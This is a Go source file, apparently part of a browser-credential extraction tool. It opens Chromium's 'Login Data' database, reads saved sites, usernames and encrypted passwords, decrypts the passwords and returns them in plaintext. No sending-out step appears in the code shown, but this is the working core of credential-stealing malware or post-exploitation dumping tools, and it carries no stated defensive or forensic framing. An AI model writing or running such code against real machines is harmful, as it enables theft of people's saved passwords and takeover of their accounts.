package browsers

import (
	"fmt"
	"path/filepath"

	_ "modernc.org/sqlite"
)

// Login represents a browser login entry
type Login struct {
	Username string
	Password string
	LoginURL string
}

// GetLogins extracts login data (username, password, URL) from Chromium-based browsers.
func (c *Chromium) GetLogins(path string) (logins []Login, err error) {
    db, err := GetDBConnection(filepath.Join(path, "Login Data"))
    if err != nil {
        fmt.Printf("Error opening database: %v\n", err)
        return nil, err
    }
    defer db.Close()

    rows, err := db.Query("SELECT action_url, username_value, password_value, date_created FROM logins")
    if err != nil {
        fmt.Printf("Error executing query: %v\n", err)
        return nil, err
    }
    defer rows.Close()

    for rows.Next() {
        var (
            url, username string
            pwd, password []byte
            create        int64
        )
        if err := rows.Scan(&url, &username, &pwd, &create); err != nil {
            fmt.Printf("Error scanning row: %v\n", err)
            continue
        }

        if url == "" || username == "" || pwd == nil {
            continue
        }

        login := Login{
            Username: string(username),
            LoginURL: url,
        }

        password, err = c.Decrypt(pwd)
        if err != nil {
            fmt.Printf("Error decrypting password: %v\n", err)
            continue
        }

        login.Password = string(password)
        logins = append(logins, login)
    }

    if len(logins) == 0 {
        fmt.Println("No logins found.")
    }

    return logins, nil
}

